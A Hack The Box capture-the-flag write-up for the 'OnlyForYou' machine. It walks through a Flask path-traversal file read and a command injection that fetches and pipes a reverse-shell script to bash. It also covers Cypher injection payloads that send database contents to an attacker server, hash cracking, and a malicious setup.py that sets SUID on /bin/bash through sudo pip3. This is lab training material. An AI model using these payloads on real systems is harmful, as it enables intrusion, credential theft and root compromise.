---
title: "Hackthebox Onlyforyou"
date: 2023-04-26T22:02:29+02:00
draft: false
---

The first step is exploiting a vulnerability in the source code of a Python application to read a local file (LFI).
This reveals another misconfiguration, which allows us to bypass regex verification and achieve remote code execution.
We then use cypher injection to get the user flag.
Finally, we exploit Python pip download vulnerabilities to escalate to root.

<!--more-->

## **Nmap**

```
# Nmap 7.93 scan initiated Sat Apr 22 21:39:58 2023 as: nmap -sC -sV -o nmap.txt 10.129.210.146
Nmap scan report for 10.129.210.146
Host is up (0.078s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e883e0a9fd43df38198aaa35438411ec (RSA)
|   256 83f235229b03860c16cfb3fa9f5acd08 (ECDSA)
|_  256 445f7aa377690a77789b04e09f11db80 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://only4you.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Apr 22 21:40:10 2023 -- 1 IP address (1 host up) scanned in 12.03 seconds
```

## **HTTP:80**

The nmap scan shows only two open ports: 22 for ssh and 80 for http.
The website on port 80 seems like a typical company website that offers services, but we notice a beta subdomain where we can test their beta products.

![image text](/only4you_beta.png)

Luckily we can download the source code and it's a python flask application which contains the vulnerable function we can exploit.
Here is the vulnerable function in the code:

```py
@app.route('/download', methods=['POST'])
def download():
    image = request.form['image']
    filename = posixpath.normpath(image)
    if '..' in filename or filename.startswith('../'):
        flash('Hacking detected!', 'danger')
        return redirect('/list')
    if not os.path.isabs(filename):
        filename = os.path.join(app.config['LIST_FOLDER'], filename)
    try:
        if not os.path.isfile(filename):
            flash('Image doesn\'t exist!', 'danger')
            return redirect('/list')
    except (TypeError, ValueError):
        raise BadRequest()
    return send_file(filename, as_attachment=True)
```

This means that we are able to do `/etc/passwd` and the file will be displayed:

![image text](/only4you_lfi.png)

The vulnerable function allows us to read files on the system. We take advantage of this to view the nginx configuration file. By requesting /download on beta.only4you.htb with the image parameter set to /var/www/only4you.htb/app.py, we are able to retrieve the source code of the Python application running on only4you.htb. This reveals that we can send a message with the app, but only authorized users are allowed to do so.

```
server {
    listen 80;
    return 301 http://only4you.htb$request_uri;
}

server {
	listen 80;
	server_name only4you.htb;

	location / {
                include proxy_params;
                proxy_pass http://unix:/var/www/only4you.htb/only4you.sock;
	}
}

server {
	listen 80;
	server_name beta.only4you.htb;

        location / {
                include proxy_params;
                proxy_pass http://unix:/var/www/beta.only4you.htb/beta.sock;
        }
}
```

A python application is also running on only4you.htb since there is an app.py file:

`curl -X POST http://beta.only4you.htb/download --data 'image=/var/www/only4you.htb/app.py'`

```py
from flask import Flask, render_template, request, flash, redirect
from form import sendmessage
import uuid

app = Flask(__name__)
app.secret_key = uuid.uuid4().hex

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        email = request.form['email']
        subject = request.form['subject']
        message = request.form['message']
        ip = request.remote_addr

        status = sendmessage(email, subject, message, ip)
        if status == 0:
            flash('Something went wrong!', 'danger')
        elif status == 1:
            flash('You are not authorized!', 'danger')
        else:
            flash('Your message was successfuly sent! We will reply as soon as possible.', 'success')
        return redirect('/#contact')
    else:
        return render_template('index.html')

@app.errorhandler(404)
def page_not_found(error):
    return render_template('404.html'), 404

@app.errorhandler(500)
def server_errorerror(error):
    return render_template('500.html'), 500

@app.errorhandler(400)
def bad_request(error):
    return render_template('400.html'), 400

@app.errorhandler(405)
def method_not_allowed(error):
    return render_template('405.html'), 405

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=80, debug=False)
```

Basically the app.py file shows us that a POST request is made when submitting the form on the main page.
Here the interesting file in form.py since the app imports it we can see his content:

`curl -X POST http://beta.only4you.htb/download --data 'image=/var/www/only4you.htb/form.py'`

```py
import smtplib, re
from email.message import EmailMessage
from subprocess import PIPE, run
import ipaddress

def issecure(email, ip):
        if not re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})", email):
                return 0
        else:
                domain = email.split("@", 1)[1]
                result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
                output = result.stdout.decode('utf-8')
                if "v=spf1" not in output:
                        return 1
                else:
                        domains = []
                        ips = []
                        if "include:" in output:
                                dms = ''.join(re.findall(r"include:.*\.[A-Z|a-z]{2,}", output)).split("include:")
                                dms.pop(0)
                                for domain in dms:
                                        domains.append(domain)
                                while True:
                                        for domain in domains:
                                                result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
                                                output = result.stdout.decode('utf-8')
                                                if "include:" in output:
                                                        dms = ''.join(re.findall(r"include:.*\.[A-Z|a-z]{2,}", output)).split("include:")
                                                        domains.clear()
                                                        for domain in dms:
                                                                domains.append(domain)
                                                elif "ip4:" in output:
                                                        ipaddresses = ''.join(re.findall(r"ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]{2}", output)).split("ip4:")
                                                        ipaddresses.pop(0)
                                                        for i in ipaddresses:
                                                                ips.append(i)
                                                else:
                                                        pass
                                        break
                        elif "ip4" in output:
                                ipaddresses = ''.join(re.findall(r"ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]{2}", output)).split("ip4:")
                                ipaddresses.pop(0)
                                for i in ipaddresses:
                                        ips.append(i)
                        else:
                                return 1
                for i in ips:
                        if ip == i:
                                return 2
                        elif ipaddress.ip_address(ip) in ipaddress.ip_network(i):
                                return 2
                        else:
                                return 1

def sendmessage(email, subject, message, ip):
        status = issecure(email, ip)
        if status == 2:
                msg = EmailMessage()
                msg['From'] = f'{email}'
                msg['To'] = 'info@only4you.htb'
                msg['Subject'] = f'{subject}'
                msg['Message'] = f'{message}'

                smtp = smtplib.SMTP(host='localhost', port=25)
                smtp.send_message(msg)
                smtp.quit()
                return status
        elif status == 1:
                return status
        else:
                return status
```

The vulnerability is there:

```py
 result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
```

Since we can perform a command injection but to do it we first need to bypass the regex validation on the email.
My payload to bypass the regex is: `test@test.com@;curl%2010.10.14.203/rev.sh%20|bash;mail.com` (of course much simpler payload exist try by yourself)
and the content of rev.sh file is just a bash reverse shell:

```bash
#!/bin/bash

/bin/bash -i >& /dev/tcp/10.10.14.203/6666 0>&1
```

After sending the request using curl we successfully get a reverse shell as www-data

```bash
rlwrap nc -lnvp 6666
listening on [any] 6666 ...
connect to [10.10.14.66] from (UNKNOWN) [10.10.11.210] 35818
bash: cannot set terminal process group (1010): Inappropriate ioctl for device
bash: no job control in this shell
www-data@only4you:~/only4you.htb$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## **Shell as john**

By using `netstat` we see several open ports locally: `3000`,`8001` and `7474`.
So let's forward these ports with chisel !
In order to do this I'll use socks proxy so I can forward all the ports:

```bash
# On the attacker machine
./chisel server --reverse --socks5 -p 8000

#On the victim session
./chisel client YOUR_IP:8000 R:socks
```

Now I'll go straight forward, the vulnerable port here is the port number `8001`

![image text](/only4you_8001.png)

This web app is vulnerable because the default credential are admin/admin. Once we’ve logged in, we jump on a dashboard.
The dashboard isn’t really interesting here, so let’s move on to the employees section.

![image text](/only4you_8001_employee.png)

I've forgotten to tell that the database for this web application is using neo4j so it may be vulnerable to cypher injection !
For this we have excellent resources on [HackTrick](https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j#common-cypher-injections).

We can try to get the version of the server with the following payload:

```
' OR 1=1 WITH 1 as a  CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.0.2.4:8000/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 //
```

It will get the server version and print it into our web server:

```bash
┌──(achla㉿achla)-[~]
└─$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.210 - - [01/May/2023 22:08:43] code 400, message Bad request syntax ('GET /?version=5.6.0&name=Neo4j Kernel&edition=community HTTP/1.1')
10.10.11.210 - - [01/May/2023 22:08:43] "GET /?version=5.6.0&name=Neo4j Kernel&edition=community HTTP/1.1" 400 -
```

As we can see the version is 5.6 and it proves to us that the web application is vulnerable to cypher injection.
Again on HackTricks there is a payload to get properties of a key:

```
' OR 1=1 WITH 1 as a MATCH (f:Flag) UNWIND keys(f) as p LOAD CSV FROM 'http://10.0.2.4:8000/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
```

Of course we need to change the key name and here we guess that the key is `user`.
Here is the output we got:

```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.210 - - [01/May/2023 22:13:46] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.10.11.210 - - [01/May/2023 22:13:46] "GET /?username=admin HTTP/1.1" 200 -
10.10.11.210 - - [01/May/2023 22:13:46] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
10.10.11.210 - - [01/May/2023 22:13:46] "GET /?username=john HTTP/1.1" 200 -
10.10.11.210 - - [01/May/2023 22:13:46] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
```

So we got two SHA-256 hashes, one for admin and one for john
Unfortunatly we can't crack the hash for admin using rockyou as wordlist
but we can crack the hash for john using john the ripper

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha256
```

I've already craked the hash so I just have to do : `john hash --show --format=raw-sha256`
Next we can ssh as john and grab the user flag.

```bash
john@only4you:~$ id
uid=1000(john) gid=1000(john) groups=1000(john)
john@only4you:~$ ls
user.txt
john@only4you:~$
```

## **Shell as root**

By making `sudo -l` as john, we see that we can use `pip3` with the download option as root
I've found an interesting [blog post](https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/)
about how we can abuse this to build a malicious python package to escalate our privileges:

```bash
john@only4you:~$ sudo -l
Matching Defaults entries for john on only4you:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on only4you:
    (root) NOPASSWD: /usr/bin/pip3 download http\://127.0.0.1\:3000/*.tar.gz
```

In order to do that we must forward port 3000 with ssh: `ssh -L 3000:127.0.0.1:3000 john@only4you.htb`
We forward port 3000 because there is Gogs service running on it which is similar to Git service.
Once logged in as john using the same password used for ssh we found a repository named test.

![image text](/only4you_gogs.png)

So to summarize we need to successfully gain root on the machine we need to:

- Create our malicious python package
- Upload it
- Make the repository public (default private)

The link above provide a GitHub link with some python code ready for us.
After downloading it we modify it a little bit:

### **Setup.py file**

```python
from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.egg_info import egg_info

import os

def RunCommand():
    os.system("chmod u+s /bin/bash")

class RunEggInfoCommand(egg_info):
    def run(self):
        RunCommand()
        egg_info.run(self)


class RunInstallCommand(install):
    def run(self):
        RunCommand()
        install.run(self)

setup(
    name = "exploit",
    version = "0.0.1",
    license = "MIT",
    packages=find_packages(),
    cmdclass={
        'install' : RunInstallCommand,
        'egg_info': RunEggInfoCommand
    },
)

```

Basically we give the SUID bit to /bin/bash which will allows us to execute a command as root (because root user will set the SUID bit)
The next step is to build the python package with `python -m build`.
Now we get the `.tar.gz` file in `dist/` directory and upload it into the `Test` repository on Gogs and make the repository public.
Finally download it using the pip command:

```bash
john@only4you:~$ sudo /usr/bin/pip3 download http\://127.0.0.1\:3000/john/Test/raw/master/exploit-0.0.1.tar.gz
Collecting http://127.0.0.1:3000/john/Test/raw/master/exploit-0.0.1.tar.gz
  Downloading http://127.0.0.1:3000/john/Test/raw/master/exploit-0.0.1.tar.gz (846 bytes)
  Saved ./exploit-0.0.1.tar.gz
Successfully downloaded exploit
john@only4you:~$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
john@only4you:~$
```

As you can see /bin/bash has the SUID bit set, all we need is to do `/bin/bash -p`

```bash
john@only4you:~$ /bin/bash -p
bash-5.0# id
uid=1000(john) gid=1000(john) euid=0(root) groups=1000(john)
bash-5.0#
```

Congrats! We are root.
I really enjoyed doing this box because I learned about cypher injection but also the path
to gain user access was really fun.
